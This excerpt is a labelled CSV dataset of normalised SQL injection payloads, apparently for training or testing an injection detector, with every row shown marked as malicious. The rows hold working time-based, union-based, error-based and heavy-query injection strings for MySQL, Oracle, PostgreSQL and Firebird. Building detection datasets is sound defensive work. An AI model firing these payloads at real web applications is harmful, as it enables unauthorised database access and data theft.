row_index,payload_norm,label,sqli_type_hint
9690,1' ) ) ) or sleep ( 5 ) and ( ( ( 'bmnf' like 'bmnf,1,
9691,1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'ejnt' like 'ejnt,1,
9692,( select ( case when ( 1570 = 6977 ) then 1 else 1570* ( select 1570 from mysql.db ) end ) ),1,
9693,1 ) ) as fpej where 6790 = 6790 and ( 3020 = 3020 ) *6703--,1,
9694,"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
9695,"1%"" union all select null,null,null,null,null,null,null,null--",1,
9696,1' and ( 5116 = 1602 ) *1602,1,
9697,1'|| ( select 'rjis' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||',1,
9698,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bxnn' = 'bxnn",1,
9699,"-1585%"" ) ) union all select 8818,8818,8818,8818,8818,8818#",1,
9700,"iif ( 1718 = 5436,1,1/0 )",1,
9701,"-1332 ) as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
9702,"1 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
9703,-8615 ) ) ) or 4039 = 9144,1,
9704,1 ) ) as beld where 1679 = 1679 or sleep ( 5 ) #,1,
9705,1 ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1,
9706,"1 ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,
9707,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'phdn' like 'phdn",1,
9708,"1 ) ) ) union all select null,null,null,null,null#",1,
9709,"1%' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( '%' = '",1,
9710,"-4983%"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""%"" = """,1,
9711,"1%"" union all select null,null--",1,
9712,"1'+ ( select 'swxi' where 7651 = 7651 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) +'",1,
9713,"1%' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
9714,-6145 or ( 8459 = 8459 ) *4906-- yklv,1,
9715,-6178 ) ) as lygb where 9559 = 9559 or ( 8459 = 8459 ) *4906--,1,
9716,"1"" ) as ikdo where 4128 = 4128",1,
9717,1 ) where 6150 = 6150,1,
9718,1' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
9719,1 ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
